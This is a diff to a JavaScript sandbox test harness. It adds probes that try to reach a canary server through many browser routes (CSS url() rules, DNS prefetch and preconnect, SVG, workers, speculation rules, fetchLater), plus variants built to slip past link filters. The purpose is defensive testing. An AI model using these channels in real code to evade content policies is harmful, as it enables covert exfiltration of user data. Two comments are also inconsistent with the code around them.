@@ -22,7 +22,7 @@ const cap = (name, code, extra = {}) => ({ name, kind: 'cap', code, ...extra });
 
 const guard = (expr) => `try { ${expr}; return 'allowed'; } catch (e) { return 'blocked'; }`;
 // each CSS probe styles its own element: a later rule on a shared one would win the cascade, and the browser would never fetch the losing image
-const cssProbe = (name, rule) => net(`css-${name}`, `css('${rule.replaceAll('.x', `.x-${name}`).replaceAll('URL', `' + u('css-${name}') + '`)}'); html('<div class="x-${name}">x</div>');`);
+const cssProbe = (name, rule, control = ALL) => net(`css-${name}`, `css('${rule.replaceAll('.x', `.x-${name}`).replaceAll('URL', `' + u('css-${name}') + '`)}'); html('<div class="x-${name}">x</div>');`, { control });
 
 export const PROBES = [
   // ---- the network, by every route we know -----------------------------------------------------------------------------
@@ -44,12 +44,28 @@ export const PROBES = [
   cssProbe('content', '.x::before{content:url(URL)}'),
   cssProbe('mask', '.x{width:20px;height:20px;background:red;-webkit-mask-image:url(URL);mask-image:url(URL)}'),
   cssProbe('image-set', ".x{background-image:image-set(url(URL) 1x)}"),
+  cssProbe('filter', ".x{filter:url(URL#f)}", []),
+  cssProbe('clip-path', ".x{width:20px;height:20px;clip-path:url(URL#c)}", ['chromium']),
+  cssProbe('shape-outside', ".x{float:left;width:20px;height:20px;shape-outside:url(URL)}"),
   cssProbe('font', "@font-face{font-family:probe;src:url(URL)} .x{font-family:probe}"),
   net('css-import', `css('@import url(' + u('css-import') + ');');`),
   net('link-stylesheet', `const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = u('link-stylesheet'); document.head.appendChild(l);`),
   net('link-prefetch', `const l = document.createElement('link'); l.rel = 'prefetch'; l.href = u('link-prefetch'); document.head.appendChild(l);`, { control: ['chromium'] }),
   net('link-preload', `const l = document.createElement('link'); l.rel = 'preload'; l.as = 'image'; l.href = u('link-preload'); document.head.appendChild(l);`),
-  net('link-preconnect', `const l = document.createElement('link'); l.rel = 'preconnect'; l.href = C; document.head.appendChild(l);`, { control: [] }),
+  net('link-preconnect', `const l = document.createElement('link'); l.rel = 'preconnect'; l.href = 'http://127.0.0.1:' + TCPS['link-preconnect']; document.head.appendChild(l); await wait(1500);`, { tcp: true, control: [] }), // no engine opens a connection for a preconnect to a loopback address, so the control page cannot show it
+  // a hint that names a host: the browser may open a connection (or ask DNS for the name) before any policy is asked. The hostname is the data an app
+  // would leak, and *.localhost resolves to this machine, so the canary's own TCP port for the probe shows whether a connection was made.
+  net('dns-prefetch', `const l = document.createElement('link'); l.rel = 'dns-prefetch'; l.href = '//' + dnsHost('dns-prefetch'); document.head.appendChild(l); await wait(1500);`, { dns: true, dnsControl: ['firefox'], control: [] }),
+  net('dns-preconnect', `const l = document.createElement('link'); l.rel = 'preconnect'; l.href = 'https://' + dnsHost('dns-preconnect'); document.head.appendChild(l); await wait(1500);`, { dns: true, dnsControl: ['firefox'], control: [] }),
+  net('dns-preconnect-anonymous', `const l = document.createElement('link'); l.rel = 'preconnect'; l.crossOrigin = 'anonymous'; l.href = 'https://' + dnsHost('dns-preconnect-anonymous'); document.head.appendChild(l); await wait(1500);`, { dns: true, dnsControl: ['firefox'], control: [] }),
+  net('dns-prefetch-anchor', `html('<a href="https://' + dnsHost('dns-prefetch-anchor') + '/">x</a>'); await wait(1500);`, { dns: true, dnsControl: ['firefox'], control: [] }),
+  net('dns-prefetch-image', `new Image().src = 'https://' + dnsHost('dns-prefetch-image') + '/x.png'; await wait(1000);`, { dns: true, dnsControl: ['chromium', 'firefox'], control: [] }),
+  // other ways to get a link element that asks for a connection: each must be refused as well
+  net('dns-preconnect-ns', `const l = document.createElementNS('http://www.w3.org/1999/xhtml', 'link'); l.setAttribute('rel', 'preconnect'); l.setAttribute('href', 'https://' + dnsHost('dns-preconnect-ns')); document.head.appendChild(l); await wait(1500);`, { dns: true, dnsControl: ['firefox'], control: [] }),
+  net('dns-preconnect-entity', `document.head.insertAdjacentHTML('beforeend', '<link rel="pre&#99;onnect" href="https://' + dnsHost('dns-preconnect-entity') + '">'); await wait(1500);`, { dns: true, dnsControl: ['firefox'], control: [] }),
+  net('dns-preconnect-custom', `class L extends HTMLLinkElement {} customElements.define('x-pre-link', L, { extends: 'link' }); const l = new L(); l.rel = 'preconnect'; l.href = 'https://' + dnsHost('dns-preconnect-custom'); document.head.appendChild(l); await wait(1500);`, { dns: true, dnsControl: ['firefox'], control: [] }),
+  net('dns-preconnect-otherdoc', `const d = document.implementation.createHTMLDocument(''); const l = d.createElement('link'); l.rel = 'preconnect'; l.href = 'https://' + dnsHost('dns-preconnect-otherdoc'); document.head.appendChild(document.adoptNode(l)); await wait(1500);`, { dns: true, dnsControl: ['firefox'], control: [] }),
+  net('dns-preconnect-clone', `const t = document.createElement('template'); t.innerHTML = '<link rel="preconnect" href="https://' + dnsHost('dns-preconnect-clone') + '">'; document.head.appendChild(t.content.cloneNode(true)); await wait(1500);`, { dns: true, dnsControl: ['firefox'], control: [] }),
   net('script-src', `const s = document.createElement('script'); s.src = u('script-src') + '.js'; document.head.appendChild(s);`),
   net('dynamic-import', `import(u('dynamic-import') + '.js').catch(() => {});`),
   net('worker-blob', `new Worker(URL.createObjectURL(new Blob(['fetch("' + u('worker-blob') + '").catch(() => {});'], { type: 'text/javascript' })));`),
@@ -64,6 +80,21 @@ export const PROBES = [
   net('embed-src', `html('<embed src="' + u('embed-src') + '" type="image/gif">');`),
   net('audio', `const a = new Audio(); a.preload = 'auto'; a.src = u('audio'); a.load();`),
   net('video', `html('<video preload="auto" src="' + u('video') + '"></video>');`),
+  net('video-poster', `html('<video poster="' + u('video-poster') + '"></video>');`),
+  net('track', `html('<video><track kind="subtitles" default src="' + u('track') + '"></video>');`, { control: [] }),
+  net('picture-source', `html('<picture><source srcset="' + u('picture-source') + '"><img alt=""></picture>');`),
+  net('input-image', `html('<input type="image" src="' + u('input-image') + '">');`),
+  net('link-modulepreload', `const l = document.createElement('link'); l.rel = 'modulepreload'; l.href = u('link-modulepreload') + '.js'; document.head.appendChild(l);`),
+  net('link-preload-fetch', `const l = document.createElement('link'); l.rel = 'preload'; l.as = 'fetch'; l.crossOrigin = 'anonymous'; l.href = u('link-preload-fetch'); document.head.appendChild(l);`),
+  net('svg-feimage', `html('<svg width="10" height="10"><filter id="fe"><feImage href="' + u('svg-feimage') + '"/></filter><rect width="10" height="10" filter="url(#fe)"/></svg>');`),
+  net('svg-use', `html('<svg width="10" height="10"><use href="' + u('svg-use') + '#x"/></svg>');`, { control: [] }),
+  net('css-worklet-paint', `await CSS.paintWorklet.addModule(u('css-worklet-paint') + '.js');`, { control: ['chromium'] }),
+  net('audio-worklet', `await new AudioContext().audioWorklet.addModule(u('audio-worklet') + '.js');`, { control: ['chromium', 'firefox'] }),
+  net('speculation-prefetch', `const e = document.createElement('script'); e.type = 'speculationrules'; e.textContent = JSON.stringify({ prefetch: [{ source: 'list', urls: [u('speculation-prefetch')] }] }); document.head.appendChild(e); await wait(1500);`, { control: ['chromium'] }),
+  net('speculation-prerender', `const e = document.createElement('script'); e.type = 'speculationrules'; e.textContent = JSON.stringify({ prerender: [{ source: 'list', urls: [u('speculation-prerender')] }] }); document.head.appendChild(e); await wait(1500);`, { control: ['chromium'] }),
+  net('fetch-later', `fetchLater(u('fetch-later'), { activateAfter: 100 }); await wait(1000);`, { control: ['chromium'] }),
+  net('shared-worker', `const w = new SharedWorker(URL.createObjectURL(new Blob(['fetch("' + u('shared-worker') + '").catch(() => {});'], { type: 'text/javascript' }))); await wait(800);`),
+  net('worker-nested', `const inner = 'fetch("' + u('worker-nested') + '").catch(() => {});'; new Worker(URL.createObjectURL(new Blob(['try { new Worker(URL.createObjectURL(new Blob([' + JSON.stringify(inner) + '], { type: "text/javascript" }))); } catch (e) {}'], { type: 'text/javascript' }))); await wait(1000);`),
   net('form-post', `html('' + IFR + ' name="sink"></iframe><form id="fp" method="post" action="' + u('form-post') + '" target="sink"><input name="a" value="1"></form>'); document.getElementById('fp').submit();`),
 
   // ---- WebRTC: no content-security-policy covers it, so the sandbox page takes the constructor away (js/sandbox.js) and nested frames
@@ -172,13 +203,17 @@ if (new Set(ids).size !== ids.length) throw new Error('two probes share a name')
 
 /** The names of the probes that have a UDP port of their own on the canary. */
 export const UDP_PROBES = PROBES.filter((p) => p.udp).map((p) => p.name);
+/** The names of the probes that have a TCP port of their own on the canary (they open a connection and send nothing). */
+/** The probes whose attack is a hostname: a lookup of it is the leak. */
+export const DNS_PROBES = PROBES.filter((p) => p.dns).map((p) => p.name);
+export const TCP_PROBES = PROBES.filter((p) => p.tcp).map((p) => p.name);
 
 /**
  * The page that runs the probes. `only` runs one probe, `group: 'main'` all but the last ones, and neither runs everything with the last
  * ones last. The same can be given as a query (`?only=name`) on the control page; inside an app there is no query, so it is baked in.
  * `early` probes run at once, while the page is still being parsed; the others wait for the page to load.
  */
-export function probePage({ canary, udpPorts = {}, udpHost = '127.0.0.1', site, only = null, group = null }) {
+export function probePage({ canary, udpPorts = {}, tcpPorts = {}, udpHost = '127.0.0.1', phase = 'x', site, only = null, group = null }) {
   const body = PROBES.map((p) => `${JSON.stringify(p.name)}: async () => { ${p.code} }`).join(',\n');
   return `<!doctype html>
 <html><head><meta charset="utf-8"><title>probes</title>
@@ -186,6 +221,9 @@ export function probePage({ canary, udpPorts = {}, udpHost = '127.0.0.1', site, 
 const C = ${JSON.stringify(canary)};
 const UDPS = ${JSON.stringify(udpPorts)};
 const UDPHOST = ${JSON.stringify(udpHost)};
+const TCPS = ${JSON.stringify(tcpPorts)};
+// a host that nothing answers for: the browser's own log shows whether it was looked up, and the name says which attack and which run
+const dnsHost = (name) => name + '.${phase}.canary.test';
 const SITE = ${JSON.stringify(site)} ?? location.origin; // an app is told the site's address; the control page is the site
 const CONFIG = ${JSON.stringify({ only, group })};
 const s = (n) => SITE + '/probe/' + n;
